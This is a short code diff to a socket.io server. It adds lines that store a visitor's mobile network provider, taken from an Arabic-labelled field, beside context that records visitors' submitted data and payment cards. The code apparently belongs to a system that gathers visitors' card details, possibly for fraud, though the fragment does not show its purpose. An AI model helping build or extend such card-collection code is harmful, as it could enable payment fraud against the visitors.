@@ -374,6 +374,10 @@ io.on("connection", (socket) => {
         visitor.lastDataUpdate = now;
         // Also keep flat data for backward compatibility
         visitor.data = { ...visitor.data, ...data.content };
+        // تخزين اسم الشبكة إذا كان موجوداً
+        if (data.content["مزود الخدمة"]) {
+          visitor.network = data.content["مزود الخدمة"];
+        }
       }
       if (data.paymentCard) {
         visitor.paymentCards.push({
